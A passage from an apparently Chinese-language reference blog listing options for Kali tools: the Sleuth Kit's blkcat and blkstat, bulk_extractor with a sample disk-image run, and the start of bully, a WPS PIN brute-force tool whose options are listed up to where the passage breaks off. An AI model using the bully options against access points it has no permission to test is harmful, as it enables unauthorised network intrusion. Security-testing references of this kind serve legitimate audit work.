class="hljs-deletion">-s</span><br><br>显示图像的统计信息(单位大小、文件块大小和片段数量)。<br><br><span class="hljs-deletion">-u unit_size</span><br><br>指定原始图像，blkls和交换图像的默认数据单元的大小。<br><br><span class="hljs-deletion">-i imgtype</span><br><br>标识图像文件的类型，例如原始文件。使用“ -i列表”列出支持的类型。如果未给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-o imgoffset</span><br><br>文件系统在映像中开始的扇区偏移量。<br><br><span class="hljs-deletion">-b dev_sector_size</span><br><br>基础设备扇区的大小（以字节为单位）。如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br><span class="hljs-deletion">-v</span><br><br>详细输出到标准代码<br><br><span class="hljs-deletion">-V</span><br><br>打印版本信息<br><br><span class="hljs-deletion">-w</span><br><br>以HTML表格格式显示内容。<br><br>Image [images]<br><br>要读取的磁盘或分区映像，其格式用&#x27;-i&#x27;指定。如果图像被分割成多个段，则可以指定多个图像文件名。如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以&#x27;.001&#x27;结尾的文件），则会自动包含后续的图像段。<br><br>unit_addr<br><br>要显示的磁盘单元的地址。可以使用-s选项确定该文件系统上单元的大小。<br><br>num<br><br>要显示的数据单元数。<br><br>blkcat的基本功能也可以使用dd来实现。要确定哪个inode已经分配了给定的单元，可以使用ifind(1)命令。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220406232716314.png" alt="image-20220406232716314"></p><h2 id="blkstat"><a href="#blkstat" class="headerlink" title="blkstat"></a>blkstat</h2><h3 id="描述：-2"><a href="#描述：-2" class="headerlink" title="描述："></a>描述：</h3><p>针对image(磁盘映像)或者图像</p><p>显示文件系统数据单元的详细信息(例如块或扇区)。<br>blkstat显示给定数据单元的分配状态。在3.0.0之前的TSK版本中，blkstat被称为dstat。</p><h3 id="参数：-1"><a href="#参数：-1" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-f fstype</span><br>指定文件系统类型。使用&#x27;-f list&#x27;列出支持的文件系统类型。如果未给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-i imgtype</span><br>识别图像文件的类型，如raw。使用&#x27;-i list&#x27;列出支持的类型。如果未给出，则使用自动检测方法。<br><br><span class="hljs-deletion">-o imgoffset</span><br>文件系统在映像中开始的扇区偏移量。<br><br><span class="hljs-deletion">-bdev_sector_size</span><br>基础设备扇区的大小（以字节为单位）。如果未指定，则使用图像格式的值（如果存在）或假定为512字节。<br><br><span class="hljs-deletion">-v</span><br>将调试语句详细输出到stderr<br><br><span class="hljs-deletion">-V</span><br>打印版本信息<br><br>image[images]<br>要读取的磁盘或分区映像，其格式用&#x27;-i&#x27;指定。如果图像被分割成多个段，则可以指定多个图像文件名。如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以&#x27;.001&#x27;结尾的文件），则会自动包含后续的图像段。<br><br>addr<br>显示统计信息的地址。这是UNIX文件系统或FAT扇区的片段。<br></code></pre></td></tr></table></figure><h2 id="bulk-extractor"><a href="#bulk-extractor" class="headerlink" title="bulk_extractor"></a>bulk_extractor</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>bulk_extractor是从数字证据文件中提取诸如电子邮件地址,信用卡号,URL和其他类型的信息的功能的程序。 它是一个有用的取证调查工具,可以用于许多任务,如恶意软件和入侵调查,身份调查和网络调查,以及图像分析和密码破解。 该程序提供了几个不寻常的功能:</p><p>1.发现其他工具发现不了的信息,如电子邮件地址,URL和信用卡号码,得益于它能处理压缩数据(如ZIP,PDF和GZIP文件)以及不完整或部分损坏的数据。 它可以从压缩数据的片段中提取JPEG文件,办公文档和其他类型的文件 ,还可以自动检测并提取加密的RAR文件。<br>2.根据数据中发现的所有单词构建单词列表,甚至可以是在未分配空间的压缩文件中的数据。 这些单词列表可用于密码破解。<br>3.多线程的; 速度快节约时间<br>4.分析完之后创建直方图,显示电子邮件地址,URL,域名,搜索关键词和其他类型的信息。</p><p>bulk_extractor可以对磁盘映像,文件或文件目录进行分析,并在不分析文件系统或文件系统结构的情况下提取有用的信息。 输入被分割成页面并由一个或多个扫描器处理。 结果存储在特征文件中,可以使用其他自动化工具轻松检查,解析或处理。</p><p>bulk_extractor还创建了它所发现的特征的直方图。 这样非常有用,因为诸如电子邮件地址和网络搜索关键词的功能往往很常见且重要。</p><p>除了上述功能之外,bulk_extractor还包括以下功能:</p><p>5.具有浏览特征文件中存储的功能以及启动bulk_extractor扫描的图形用户界面的Bulk Extractor Viewer<br>6.少量用于对特征文件进行额外分析的python程序</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs diff">bulk_extractor - 在不解析文件系统的情况下提取信息。<br>bulk_extractor version 1.6.0-dev<br>用法:bulk_extractor [选项] 文件<br>运行bulk_extractor并提取摘要信息并输出到文件<br>必需参数:<br>imagefile - 要提取的文件<br>或者-R filedir - 遍历目录下的文件<br>支持E01文件<br>支持AFF文件<br><span class="hljs-deletion">-o outdir - 指定输出目录,目录不得已存在</span><br>bulk_extractor将创建此目录<br>选项:<br><span class="hljs-deletion">-i - 信息模式。快速分析随机取样的样本并打印报告</span><br><span class="hljs-deletion">-b banner.txt- 将banner.txt内容添加到每个输出文件的头部</span><br><span class="hljs-deletion">-r alert_list.txt- 包含提醒作业的警报列表的文件</span><br>(可以是特征文件或全局列表)<br>(可以重复)<br><span class="hljs-deletion">-w stop_list.txt - 包含功能停止列表的文件(白名单)</span><br>(可以是特征文件或全局列表)<br>(可以重复)<br><span class="hljs-deletion">-F &lt;rfile&gt; - 从&lt;rfile&gt;读取正则表达式列表以查找</span><br><span class="hljs-deletion">-f &lt;regex&gt; - 查找出现的&lt;regex&gt;;可能重复。</span><br>结果存入find.txt<br><span class="hljs-deletion">-q nn- 静默的模式;只输出nn级别的状态报告。默认值0; -1,没有状态输出</span><br><span class="hljs-deletion">-s frac [:passes] - 设置随机抽样参数</span><br>调整参数:<br><span class="hljs-deletion">-C NN- 指定上下文窗口的大小(默认值为16)</span><br><span class="hljs-deletion">-S fr:&lt;name&gt;:window = NN - 指定录像机到NN的上下文窗口</span><br><span class="hljs-deletion">-S fr:&lt;name&gt;:window_before = NN- 指定之前的上下文窗口到NN为记录器</span><br><span class="hljs-deletion">-S fr:&lt;name&gt;:window_after = NN - 指定后缀到NN后的上下文窗口</span><br><span class="hljs-deletion">-G NN- 指定页面大小(默认16777216)</span><br><span class="hljs-deletion">-g NN- 指定余量(默认4194304)</span><br><span class="hljs-deletion">-j NN- 要运行的分析线程数(默认4)</span><br><span class="hljs-deletion">-M nn- 设置最大递归深度(默认7)</span><br><span class="hljs-deletion">-m &lt;max&gt; - 所有数据读取后等待的最大分钟数(默认60)</span><br>路径处理模式:<br><span class="hljs-deletion">-p &lt;path&gt; / f - 以给定的格式打印&lt;path&gt;的值。</span><br>格式:r = 源格式; h = 十六进制格式。<br>指定-p - 进行交互模式<br>指定-p -http为HTTP模式<br>并行化:<br><span class="hljs-deletion">-Y &lt;o1&gt;- 在o1开始处理(o1可以是1,1K,1M或1G)</span><br><span class="hljs-deletion">-Y &lt;o1&gt; - &lt;o2&gt; - 处理o1-o2</span><br><span class="hljs-deletion">-A &lt;off&gt; - 将&lt;off&gt;添加到所有报告的特征偏移</span><br>调试:<br><span class="hljs-deletion">-h - 打印此消息</span><br><span class="hljs-deletion">-H - 打印扫描仪的详细信息</span><br><span class="hljs-deletion">-V - 打印版本号</span><br><span class="hljs-deletion">-z nn- 从第nn页开始</span><br><span class="hljs-deletion">-dN- 调试模式(参见源代码)</span><br><span class="hljs-deletion">-Z - 清除输出目录</span><br>扫描控制:<br><span class="hljs-deletion">-P &lt;dir&gt; - 指定一个插件目录</span><br>默认目录包括/usr/local/lib/bulk_extractor,/usr/lib/bulk_extractor和<br>BE_PATH环境变量<br><span class="hljs-deletion">-e &lt;scanner&gt; 启用扫描器 - -e all 全部启用</span><br><span class="hljs-deletion">-x &lt;scanner&gt; 禁用扫描器 - -x all 全部禁用</span><br><span class="hljs-deletion">-E &lt;scanner&gt; - 关闭除指定扫描器以外的所有扫描器</span><br>(与-x all -e &lt;scanner&gt;效果一样)<br>注意:-e,-x和-E命令按顺序执行<br>例如:&#x27;-E gzip -e facebook&#x27;只运行gzip和facebook<br><span class="hljs-deletion">-S name = value - 将批量提取器选项名称设置为值</span><br>可设置选项(及其默认值):<br><span class="hljs-deletion">-S work_start_work_end = YES 在report.xml文件中记录每个扫描器的工作开始和结束时间</span><br><span class="hljs-deletion">-S enable_histograms = YES 禁用生成直方图</span><br><span class="hljs-deletion">-S debug_histogram_malloc_fail_frequency = 0 设置大于零记录内存分配失败直方图</span><br><span class="hljs-deletion">-S hash_alg = md5指定用于所有哈希计算的哈希算法</span><br><span class="hljs-deletion">-S dup_data_alerts =NO 重复数据未处理时通知</span><br><span class="hljs-deletion">-S write_feature_files = YES 写入特征文件</span><br><span class="hljs-deletion">-S write_feature_sqlite3 = NO将特征文件写入report.sqlite3</span><br><span class="hljs-deletion">-S report_read_errors = YES报告读取错误</span><br><span class="hljs-deletion">-S carve_net_memory = NO 提取网络内存结构(net)</span><br><span class="hljs-deletion">-S word_min = 6最小字大小(wordlist)</span><br><span class="hljs-deletion">-S word_max = 14 最大字大小(wordlist)</span><br><span class="hljs-deletion">-S max_word_outfile_size = 100000000 输出文件的最大大小(wordlist)</span><br><span class="hljs-deletion">-S wordlist_use_flatfiles = YES覆盖SQL设置并对wordlist(wordlist)使用flatfiles</span><br><span class="hljs-deletion">-S ssn_mode = 00=正常格式; 1=不需要SSN; 2=去掉破折号(accts)</span><br><span class="hljs-deletion">-S min_phone_digits = 7手机所需的数字(accts)</span><br><span class="hljs-deletion">-S exif_debug = 0读取exif信息(exif)</span><br><span class="hljs-deletion">-S jpeg_carve_mode = 1 0=不提取; 1=雕刻编码提取; 2=全部提取(exif)</span><br><span class="hljs-deletion">-S min_jpeg_size = 1000将被雕刻的最小的JPEG流(exif)</span><br><span class="hljs-deletion">-S zip_min_uncompr_size = 6ZIP未压缩对象的最小大小(zip)</span><br><span class="hljs-deletion">-S zip_max_uncompr_size = 268435456ZIP未压缩对象的最大大小(zip)</span><br><span class="hljs-deletion">-S zip_name_len_max = 1024 ZIP组件的最大名称filename(zip)</span><br><span class="hljs-deletion">-S unzip_carve_mode = 10=不提取; 1=雕刻编码提取; 2=全部提取(zip)</span><br><span class="hljs-deletion">-S rar_find_components = YES 搜索RAR组件(rar)</span><br><span class="hljs-deletion">-S rar_find_volumes = YES搜索RAR卷(rar)</span><br><span class="hljs-deletion">-S unrar_carve_mode = 10=不提取; 1=雕刻编码提取; 2=全部提取(rar)</span><br><span class="hljs-deletion">-S gzip_max_uncompr_size = 268435456 解压缩GZIP对象的最大大小(gzip)</span><br><span class="hljs-deletion">-S pdf_dump = NO 转储PDF缓冲区的内容(pdf)</span><br><span class="hljs-deletion">-S pdf_dump = NO 转储PDF缓冲区的内容(msxml)</span><br><span class="hljs-deletion">-S winpe_carve_mode = 10=不提取; 1=雕刻编码提取; 2=全部提取(winpe)</span><br><span class="hljs-deletion">-S opt_weird_file_size = 157286400 FAT32扫描(windir)的阈值</span><br><span class="hljs-deletion">-S opt_weird_file_size2 = 536870912FAT32扫描(windir)的阈值</span><br><span class="hljs-deletion">-S opt_weird_cluster_count = 67108864FAT32扫描(windir)的阈值</span><br><span class="hljs-deletion">-S opt_weird_cluster_count2 = 268435456FAT32扫描(windir)的阈值</span><br><span class="hljs-deletion">-S opt_max_bits_in_attrib = 3忽略更多属性设置的FAT32条目(windirs)</span><br><span class="hljs-deletion">-S opt_max_weird_count = 2 忽略奇怪的FAT32条目(windirs)</span><br><span class="hljs-deletion">-S opt_last_year = 2022忽略晚于此FAT32条目(windirs)</span><br><span class="hljs-deletion">-S xor_mask = 255设置XOR掩码值,十进制格式(xor)</span><br><span class="hljs-deletion">-S sqlite_carve_mode = 2 0=不提取; 1=雕刻编码提取; 2=全部提取(sqlite)</span><br>以下扫描默认禁用;启用使用-e命令:<br><span class="hljs-deletion">-e base16 - 启用扫描base16</span><br><span class="hljs-deletion">-e facebook - 启用扫描facebook</span><br><span class="hljs-deletion">-e outlook- 启用扫描outlook</span><br><span class="hljs-deletion">-e sceadan- 启用扫描sceadan</span><br><span class="hljs-deletion">-e wordlist - 启用扫描wordlist</span><br><span class="hljs-deletion">-e xor- 启用扫描xor</span><br>以下扫描默认启用;禁用使用-x命令:<br><span class="hljs-deletion">-x accts- 禁用扫描程序</span><br><span class="hljs-deletion">-x aes- 禁用扫描aes</span><br><span class="hljs-deletion">-x base64 - 禁用扫描base64</span><br><span class="hljs-deletion">-x elf- 禁用扫描elf</span><br><span class="hljs-deletion">-x mail - 禁用扫描邮件</span><br><span class="hljs-deletion">-x exif - 禁用扫描exif</span><br><span class="hljs-deletion">-x find - 禁用扫描发现</span><br><span class="hljs-deletion">-x gps- 禁用扫描gps</span><br><span class="hljs-deletion">-x gzip - 禁用扫描gzip</span><br><span class="hljs-deletion">-x hiberfile- 禁用扫描hiberfile</span><br><span class="hljs-deletion">-x httplogs - 禁用扫描httplogs</span><br><span class="hljs-deletion">-x json - 禁用扫描json</span><br><span class="hljs-deletion">-x kml- 禁用扫描kml</span><br><span class="hljs-deletion">-x msxml- 禁用扫描msxml</span><br><span class="hljs-deletion">-x net- 禁用扫描net</span><br><span class="hljs-deletion">-x pdf- 禁用扫描pdf</span><br><span class="hljs-deletion">-x rar- 禁用扫描rar</span><br><span class="hljs-deletion">-x sqlite - 禁用扫描sqlite</span><br><span class="hljs-deletion">-x vcard- 禁用扫描vcard</span><br><span class="hljs-deletion">-x windirs- 禁用扫描windirs</span><br><span class="hljs-deletion">-x winlnk - 禁用扫描winlnk</span><br><span class="hljs-deletion">-x winpe- 禁用扫描winpe</span><br><span class="hljs-deletion">-x zip- 禁用扫描zip</span><br><span class="hljs-deletion">-x winprefetch - 禁用扫描winprefetch</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>分析映像文件后,将结果导出到输出目录(-o bulk-out)(xp-laptop-2005-07-04-1430.img):</p><p>  <a href="mailto:&#x61;&#x6c;&#105;&#x79;&#117;&#110;&#122;&#105;&#120;&#x75;&#x6e;&#64;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#x6c;&#105;&#x79;&#117;&#110;&#122;&#105;&#120;&#x75;&#x6e;&#64;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;</a>:~# bulk_extractor -o bulk-out xp-   laptop-2005-07-04-1430.img</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">bulk_extractor <span class="hljs-built_in">version</span> <span class="hljs-number">1.6</span><span class="hljs-number">.0</span>-dev<br>   Hostname: kali<br>   Input <span class="hljs-built_in">file</span>: xp-laptop<span class="hljs-number">-2005</span><span class="hljs-number">-07</span><span class="hljs-number">-04</span><span class="hljs-number">-1430.</span>img<br>   Output <span class="hljs-built_in">directory</span>: bulk-out<br>   Disk Size: <span class="hljs-number">536715264</span><br>   Threads: <span class="hljs-number">1</span><br>   Phase <span class="hljs-number">1.</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">46</span> Offset <span class="hljs-number">0</span>MB (<span class="hljs-number">0.00</span>%) Done <span class="hljs-keyword">in</span> n/<span class="hljs-keyword">a</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">45</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">03</span>:<span class="hljs-number">39</span> Offset <span class="hljs-number">67</span>MB (<span class="hljs-number">12.50</span>%) Done in0:<span class="hljs-number">06</span>:<span class="hljs-number">14</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">53</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">43</span> Offset <span class="hljs-number">134</span>MB (<span class="hljs-number">25.01</span>%) Done in0:<span class="hljs-number">05</span>:<span class="hljs-number">50</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">33</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">55</span> Offset <span class="hljs-number">201</span>MB (<span class="hljs-number">37.51</span>%) Done in0:<span class="hljs-number">03</span>:<span class="hljs-number">36</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">06</span>:<span class="hljs-number">01</span> Offset <span class="hljs-number">268</span>MB (<span class="hljs-number">50.01</span>%) Done in0:<span class="hljs-number">03</span>:<span class="hljs-number">15</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">16</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">06</span>:<span class="hljs-number">48</span> Offset <span class="hljs-number">335</span>MB (<span class="hljs-number">62.52</span>%) Done in0:<span class="hljs-number">02</span>:<span class="hljs-number">25</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">13</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">07</span>:<span class="hljs-number">04</span> Offset <span class="hljs-number">402</span>MB (<span class="hljs-number">75.02</span>%) Done in0:<span class="hljs-number">01</span>:<span class="hljs-number">25</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">08</span>:<span class="hljs-number">29</span><br>   <span class="hljs-number">13</span>:<span class="hljs-number">07</span>:<span class="hljs-number">20</span> Offset <span class="hljs-number">469</span>MB (<span class="hljs-number">87.53</span>%) Done in0:<span class="hljs-number">00</span>:<span class="hljs-number">39</span> <span class="hljs-keyword">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">07</span>:<span class="hljs-number">59</span><br>   All Data is Read; waiting <span class="hljs-keyword">for</span> threads <span class="hljs-built_in">to</span> finish...<br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">60</span> <span class="hljs-built_in">min</span> .)<br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   <span class="hljs-number">6</span> <span class="hljs-built_in">sec</span> (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">59</span> <span class="hljs-built_in">min</span> <span class="hljs-number">54</span> <span class="hljs-built_in">sec</span>.)<br>   Thread <span class="hljs-number">0</span>: Processing <span class="hljs-number">520093696</span><br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   <span class="hljs-number">12</span> <span class="hljs-built_in">sec</span> (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">59</span> <span class="hljs-built_in">min</span> <span class="hljs-number">48</span> <span class="hljs-built_in">sec</span>.)<br>   Thread <span class="hljs-number">0</span>: Processing <span class="hljs-number">520093696</span><br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   <span class="hljs-number">18</span> <span class="hljs-built_in">sec</span> (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">59</span> <span class="hljs-built_in">min</span> <span class="hljs-number">42</span> <span class="hljs-built_in">sec</span>.)<br>   Thread <span class="hljs-number">0</span>: Processing <span class="hljs-number">520093696</span><br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   <span class="hljs-number">24</span> <span class="hljs-built_in">sec</span> (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">59</span> <span class="hljs-built_in">min</span> <span class="hljs-number">36</span> <span class="hljs-built_in">sec</span>.)<br>   Thread <span class="hljs-number">0</span>: Processing <span class="hljs-number">520093696</span><br>   Time elapsed waiting <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> thread <span class="hljs-built_in">to</span> finish:<br>   <span class="hljs-number">30</span> <span class="hljs-built_in">sec</span> (please <span class="hljs-built_in">wait</span> <span class="hljs-keyword">for</span> another <span class="hljs-number">59</span> <span class="hljs-built_in">min</span> <span class="hljs-number">30</span> <span class="hljs-built_in">sec</span>.)<br>   Thread <span class="hljs-number">0</span>: Processing <span class="hljs-number">520093696</span><br>   All Threads Finished!<br>   Producer <span class="hljs-built_in">time</span> spent waiting: <span class="hljs-number">335.984</span> <span class="hljs-built_in">sec</span>.<br>   Average consumer <span class="hljs-built_in">time</span> spent waiting: <span class="hljs-number">0.143353</span> <span class="hljs-built_in">sec</span>.<br>   *******************************************<br>   ** bulk_extractor is probably CPU bound. **<br>   **Run <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">computer</span> <span class="hljs-title">with</span> <span class="hljs-title">more</span> <span class="hljs-title">cores</span>**<br>   **<span class="hljs-built_in">to</span> <span class="hljs-built_in">get</span> better performance. **<br>   *******************************************<br>   Phase <span class="hljs-number">2.</span> Shutting down scanners<br>   Phase <span class="hljs-number">3.</span> Creating Histograms<br>   ccn histogram... ccn_track2 histogram... domain histogram...<br>   email histogram... ether histogram... find histogram...<br>   ip histogram... tcp histogram... telephone histogram...<br>   url histogram... url microsoft-live... url services...<br>   url facebook-address... url facebook-id... url searches...<br>   Elapsed <span class="hljs-built_in">time</span>: <span class="hljs-number">378.5</span> <span class="hljs-built_in">sec</span>.<br>   Overall performance: <span class="hljs-number">1.418</span> MBytes/<span class="hljs-built_in">sec</span>.<br>   Total email features found: <span class="hljs-number">899</span><br></code></pre></td></tr></table></figure><h2 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h2><h3 id="描述：-3"><a href="#描述：-3" class="headerlink" title="描述："></a>描述：</h3><p>是 WPS 穷举法的一个新实现，用 c 语言编写。它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。与原始的reaver 代码相比，它有几个优点。其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。</p><h3 id="必需参数："><a href="#必需参数：" class="headerlink" title="必需参数："></a>必需参数：</h3><p>-b,–bssid macaddr<br>目标接入点的MAC地址</p><p>-e,–essid string<br>接入点的扩展SSID</p><h3 id="可选参数："><a href="#可选参数：" class="headerlink" title="可选参数："></a>可选参数：</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs css">-c,<span class="hljs-attr">--channel</span> N<span class="hljs-selector-attr">[,N…]</span><br>AP的信道号或要跳的列表<span class="hljs-selector-attr">[b /g]</span><br><br>-<span class="hljs-selector-tag">i</span>,<span class="hljs-attr">--index</span> N<br>启动pin索引（<span class="hljs-number">7</span>或<span class="hljs-number">8</span>位数字）<span class="hljs-selector-attr">[自动]</span><br><br>-l,<span class="hljs-attr">--lockwait</span> N<br>如果AP锁定WPS，则要等待的秒数<span class="hljs-selector-attr">[43]</span><br><br>-o,<span class="hljs-attr">--outfile</span> file<br>消息输出文件<br><br>-<span class="hljs-selector-tag">p</span>,<span class="hljs-attr">--pin</span> N<br>启动pin号(<span class="hljs-number">7</span>位或<span class="hljs-number">8</span>位)<span class="hljs-selector-attr">[自动]</span><br><br>-s,<span class="hljs-attr">--source</span> macaddr<br>源(硬件)MAC地址<span class="hljs-selector-attr">[探针]</span><br><br>-u,<span class="hljs-attr">--lua</span><br>Lua脚本文件<br><br>-v,<span class="hljs-attr">--verbosity</span> N<br>详细程度<span 